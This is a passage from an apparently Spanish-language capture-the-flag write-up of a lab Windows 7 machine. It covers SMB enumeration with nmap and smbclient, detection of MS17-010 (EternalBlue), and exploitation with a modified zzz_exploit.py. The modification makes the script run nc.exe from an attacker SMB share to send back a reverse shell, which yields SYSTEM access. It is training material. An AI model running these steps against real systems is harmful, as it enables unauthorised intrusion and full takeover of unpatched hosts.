+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.10.40<span style="color:#ae81ff">\I</span>PC$: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_IPC_HIDDEN
+</span></span><span style="display:flex;"><span>|     Comment: Remote IPC
+</span></span><span style="display:flex;"><span>|     Anonymous access: READ
+</span></span><span style="display:flex;"><span>|     Current user access: READ/WRITE
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.10.40<span style="color:#ae81ff">\S</span>hare: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE
+</span></span><span style="display:flex;"><span>|     Comment: 
+</span></span><span style="display:flex;"><span>|     Anonymous access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>|     Current user access: READ
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.10.40<span style="color:#ae81ff">\U</span>sers: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE
+</span></span><span style="display:flex;"><span>|     Comment: 
+</span></span><span style="display:flex;"><span>|     Anonymous access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>|_    Current user access: READ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 44.44 seconds
+</span></span></code></pre></div><p>Este script nos sirve para ver los archivos compartidos que hay en el <strong>servicio SMB</strong>, en este caso, vemos varios recursos dentro del SMB, es posible que podamos ver lo que contienen con un par de herramientas que veremos más adelante.</p>
+<ul>
+<li><strong>Script de reconocimiento de vulnerabilidades de NMAP para SMB</strong></li>
+</ul>
+<p>Dentro de <strong>nmap</strong>, existen muchos scripts de reconocimientos, separados por categorias, veamos que categorias maneja <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate .nse | xargs grep <span style="color:#e6db74">&#34;categories&#34;</span> | grep -oP <span style="color:#e6db74">&#39;&#34;.*?&#34;&#39;</span> | sort -u
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;auth&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;broadcast&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;brute&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;default&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;discovery&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;dos&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;exploit&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;external&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;fuzzer&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;intrusive&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;malware&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;safe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;version&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;vuln&#34;</span>
+</span></span></code></pre></div><p>Vemos varias, las que nos pueden interesar en este momento son la de <strong>vuln, discovery, intrusive, auth y brute</strong>, pero vamos a usar la de <strong>vuln</strong> unicamente, para que podamos encontrar a que es vulnerable el <strong>SMB</strong> y usaremos la categoria <strong>safe</strong>, para que sea de forma segura y no hagamos tanto ruido en el sistema a escanear:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script <span style="color:#e6db74">&#34;vuln and safe&#34;</span> -p445 10.10.10.40 -oN smbVulnScan
+</span></span><span style="display:flex;"><span>Nmap 7.93 scan initiated Jan <span style="color:#ae81ff">19</span> 12:42:40 <span style="color:#ae81ff">2023</span> as: nmap --script <span style="color:#e6db74">&#34;vuln and safe&#34;</span> -p445 -oN smbVulnScan 10.10.10.40
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.40
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-vuln-ms17-010: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2017-0143
+</span></span><span style="display:flex;"><span>|     Risk factor: HIGH
+</span></span><span style="display:flex;"><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span></span><span style="display:flex;"><span>|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|           
+</span></span><span style="display:flex;"><span>|     Disclosure date: 2017-03-14
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</span></span><span style="display:flex;"><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span></span><span style="display:flex;"><span>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span> at Jan <span style="color:#ae81ff">19</span> 12:42:44 <span style="color:#ae81ff">2023</span> -- <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.35 seconds
+</span></span></code></pre></div><p>Observa que ya nos dio un Exploit al que es vulnerable el <strong>servicio SMB</strong> de la máquina víctima, esto lo usaremos más adelante. Es momento de probar la herramienta <strong>smbclient</strong>.</p>
+<h3 id="herra">Probando Herramienta smbclient</h3>
+<p>Recordemos que podemos loguearnos como invitados en el <strong>servicio SMB</strong>, vamos a probarlo con esta herramienta, pero primero veamos si podemos listar los recursos compartidos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L 10.10.10.40                                       
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        Share           Disk      
+</span></span><span style="display:flex;"><span>        Users           Disk      
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.10.40 failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>Bien, podemos ver 5 recursos, veamos si podemos loguearnos a alguno de estos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.10.40/ADMIN
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>smbclient //10.10.10.40/C
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>smbclient //10.10.10.40/IPC
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>smbclient //10.10.10.40/Share
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jul <span style="color:#ae81ff">14</span> 08:48:44 <span style="color:#ae81ff">2017</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jul <span style="color:#ae81ff">14</span> 08:48:44 <span style="color:#ae81ff">2017</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">4692735</span> blocks of size 4096. <span style="color:#ae81ff">658102</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>smbclient //10.10.10.40/Users
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\r</span>oot<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                  DR        <span style="color:#ae81ff">0</span>  Fri Jul <span style="color:#ae81ff">21</span> 01:56:23 <span style="color:#ae81ff">2017</span>
+</span></span><span style="display:flex;"><span>  ..                                 DR        <span style="color:#ae81ff">0</span>  Fri Jul <span style="color:#ae81ff">21</span> 01:56:23 <span style="color:#ae81ff">2017</span>
+</span></span><span style="display:flex;"><span>  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 02:07:31 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Mon Jul <span style="color:#ae81ff">13</span> 23:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Public                             DR        <span style="color:#ae81ff">0</span>  Tue Apr <span style="color:#ae81ff">12</span> 02:51:29 <span style="color:#ae81ff">2011</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">4692735</span> blocks of size 4096. <span style="color:#ae81ff">658102</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd Public
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                  DR        <span style="color:#ae81ff">0</span>  Tue Apr <span style="color:#ae81ff">12</span> 02:51:29 <span style="color:#ae81ff">2011</span>
+</span></span><span style="display:flex;"><span>  ..                                 DR        <span style="color:#ae81ff">0</span>  Tue Apr <span style="color:#ae81ff">12</span> 02:51:29 <span style="color:#ae81ff">2011</span>
+</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Mon Jul <span style="color:#ae81ff">13</span> 23:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Documents                          DR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:08:56 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Downloads                          DR        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">13</span> 23:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Favorites                         DHR        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">13</span> 21:34:59 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Libraries                         DHR        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">13</span> 23:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Music                              DR        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">13</span> 23:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Pictures                           DR        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">13</span> 23:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Recorded TV                        DR        <span style="color:#ae81ff">0</span>  Tue Apr <span style="color:#ae81ff">12</span> 02:51:29 <span style="color:#ae81ff">2011</span>
+</span></span><span style="display:flex;"><span>  Videos                             DR        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">13</span> 23:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">4692735</span> blocks of size 4096. <span style="color:#ae81ff">658102</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\&gt;</span> exit
+</span></span></code></pre></div><p>Como contraseña, estoy usando cualquiera, pero como podras ver, no tenemos acceso a ninguna de las importantes, solamente tenemos acceso a Shares y Users, pero en ambas no hay nada que podamos usar ni que nos sea útil.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Exploit">Buscando y Configurando un Exploit</h3>
+<p>Vamos a buscar un Exploit con la herramienta <strong>Searchsploit</strong>, recuerda que ya descubrimos que es vulnerable al <strong>Eternal Blue</strong>, podemos buscarlo de esta manera o por su CVE que es <strong>MS17-010</strong>:</p>
+<ul>
+<li><strong>MS17-010</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit MS17-010
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                                                                           |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Microsoft Windows - <span style="color:#e6db74">&#39;EternalRomance&#39;</span>/<span style="color:#e6db74">&#39;EternalSynergy&#39;</span>/<span style="color:#e6db74">&#39;EternalChampion&#39;</span> SMB Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>MS17-010<span style="color:#f92672">)</span>                                                                                | windows/remote/43970.rb
+</span></span><span style="display:flex;"><span>Microsoft Windows - SMB Remote Code Execution Scanner <span style="color:#f92672">(</span>MS17-010<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                                                                            | windows/dos/41891.rb
+</span></span><span style="display:flex;"><span>Microsoft Windows 7/2008 R2 - <span style="color:#e6db74">&#39;EternalBlue&#39;</span> SMB Remote Code Execution <span style="color:#f92672">(</span>MS17-010<span style="color:#f92672">)</span>                                                                                                                         | windows/remote/42031.py
+</span></span><span style="display:flex;"><span>Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - <span style="color:#e6db74">&#39;EternalBlue&#39;</span> SMB Remote Code Execution <span style="color:#f92672">(</span>MS17-010<span style="color:#f92672">)</span>                                                                                                     | windows/remote/42315.py
+</span></span><span style="display:flex;"><span>Microsoft Windows 8/8.1/2012 R2 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;EternalBlue&#39;</span> SMB Remote Code Execution <span style="color:#f92672">(</span>MS17-010<span style="color:#f92672">)</span>                                                                                                               | windows_x86-64/remote/42030.py
+</span></span><span style="display:flex;"><span>Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;SrvOs2FeaToNt&#39;</span> SMB Remote Code Execution <span style="color:#f92672">(</span>MS17-010<span style="color:#f92672">)</span>                                                                                                            | windows_x86-64/remote/41987.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>En este punto, vamos a utilizar tres versiones de este Exploit, usaremos una versión de github que me ayudara a explicar un poco mejor como funciona este Exploit, la versión de <strong>Searchsploit</strong> y la que tiene Metasploit. Primero, usemos la de <strong>GitHub</strong>.</p>
+<h3 id="exploit1">Probando Exploit EternalBlue de GitHub</h3>
+<p>Vamos a clonar el siguiente repositorio:</p>
+<ul>
+<li><a href="https://github.com/worawit/MS17-010" target="_blank">Repositorio de Worawit: MS17-010</a></li>
+</ul>
+<p>Clonalo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/worawit/MS17-010.git
+</span></span><span style="display:flex;"><span>Clonando en <span style="color:#e6db74">&#39;MS17-010&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 183, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>131/131<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>45/45<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">183</span> <span style="color:#f92672">(</span>delta 88<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">86</span> <span style="color:#f92672">(</span>delta 86<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">52</span>
+</span></span><span style="display:flex;"><span>Recibiendo objetos: 100% <span style="color:#f92672">(</span>183/183<span style="color:#f92672">)</span>, 107.30 KiB | 779.00 KiB/s, listo.
+</span></span><span style="display:flex;"><span>Resolviendo deltas: 100% <span style="color:#f92672">(</span>104/104<span style="color:#f92672">)</span>, listo.
+</span></span></code></pre></div><p>Bien, en este caso, tenemos muchas opciones para usar, si recordamos los escaneos que hicimos previamente, sabemos que la máquina usa <strong>Windows 7</strong>, aunque aca tienen una versión para este SO, es mejor utilizar el <strong>script zzz_exploit.py</strong>, ya que engloba varias versiones de <strong>Windows</strong> y bueno&hellip;es el mismo exploit que vamos a usar después.</p>
+<p>Para usar correctamente este Exploit, necesitamos saber las <strong>named pipes</strong> que estan encendidas en el <strong>servicio SMB</strong>, para esto, usaremos el <strong>script checker.py</strong> y usamos cualquiera que nos de. Lo que vamos a realizar, es un <strong>Named Pipes Impersonation</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Named Pipes Impersonation</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Es una técnica que permite escalar privilegios. Un named pipe es una técnica que tiene el sistema operativo Windows para facilitar la comunicación entre procesos. Es sencillo, si un proceso quiere &ldquo;contactar&rdquo; con otro, el primero de los procesos puede enviar un mensaje sobre la red o utilizar un fichero. En el segundo caso, el proceso escribe el mensaje en un fichero y el otro proceso lo lee.</em></td>
+			</tr>
+	</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 checker.py 10.10.10.40
+</span></span><span style="display:flex;"><span>Target OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>The target is not patched
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> Testing named pipes <span style="color:#f92672">===</span>
+</span></span><span style="display:flex;"><span>spoolss: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>samr: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>netlogon: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>lsarpc: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>browser: STATUS_ACCESS_DENIED
+</span></span></code></pre></div><p>Excelente, en mi caso voy a usar la de <strong>samr</strong>, intenta con las demás si quieres probar si con todas funciona este Exploit.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Protocolo SAMR</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El Protocolo Remoto del Administrador de Cuentas de Seguridad (SAMR) es una parte de SMB, que proporciona administración remota de información de cuentas y políticas de seguridad para sistemas basados en Windows. SAMR es un protocolo RPC (Remote Procedure Call) construido sobre el protocolo SMB, que permite la comunicación entre sistemas cliente y servidor.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora, modificaremos un poco el script para que podamos cargar y ejecutar una <strong>netcat</strong> dentro de la máquina víctima, entonces necesitaremos una netcat que se pueda ejecutar en Windows y activar recursos compartidos a nivel de red con <strong>Impacket</strong> para cargar la <strong>netcat</strong>, hagamoslo por pasos:</p>
+<ul>
+<li>Modificando el script:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;guest&#39;</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>ANTES: service_exec<span style="color:#f92672">(</span>conn, r<span style="color:#e6db74">&#39;cmd /c copy c:\pwned.txt c:\pwned_exec.txt&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DESPUES: service_exec<span style="color:#f92672">(</span>conn, r<span style="color:#e6db74">&#39;cmd /c C:\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP 443&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li>Buscando y descargando <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate nc.exe
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>cp cp /usr/share/windows-resources/binaries/nc.exe .
+</span></span></code></pre></div><p><strong>NOTA</strong>: La <strong>netcat</strong> debe ser para arquitectura de <strong>64 bits</strong>, pues esta es la arquitectura que maneja la máquina. Por lo que se, Kali ya cuenta con uno en sus binarios de windows, pero puedes descargar una desde internet por si las dudas: <a href="https://eternallybored.org/misc/netcat/" target="_blank">Netcat 32bits y 64bits</a></p>
+<ul>
+<li>Abriendo un archivo compartido a nivel de red de nuestro directorio actual de trabajo (osease, donde tengamos la <strong>nc.exe</strong>) con <strong>Impacket</strong> y le damos soporte de <strong>SMBv2</strong> por si las dudas:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-smbserver smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> ...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li>Abriendo una <strong>netcat</strong> en nuestra máquina con <strong>rlwrap</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Y activamos el script:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 zzz_exploit.py 10.10.10.40 samr
+</span></span><span style="display:flex;"><span>Target OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Target is <span style="color:#ae81ff">64</span> bit
+</span></span><span style="display:flex;"><span>Got frag size: 0x10
+</span></span><span style="display:flex;"><span>GROOM_POOL_SIZE: 0x5030
+</span></span><span style="display:flex;"><span>BRIDE_TRANS_SIZE: 0xfa0
+</span></span><span style="display:flex;"><span>CONNECTION: 0xfffffa800332fba0
+</span></span><span style="display:flex;"><span>SESSION: 0xfffff8a0039a56e0
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Done
+</span></span></code></pre></div><p>Y observa el <strong>rlwrap</strong>, ya debemos tener una sesión activada:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Entramos justo como administrador de la máquina, ya solo es cuestión de buscar las flags y listo, vayamos con las otras formas de ganar acceso a la máquina.</p>
+<h3 id="exploit2">Probando Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &lsquo;EternalBlue&rsquo; SMB Remote Code Execution (MS17-010)</h3>
+<p>Vamos a descargarlo y veamos si tiene un mensaje sobre como usarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m windows/remote/42315.py
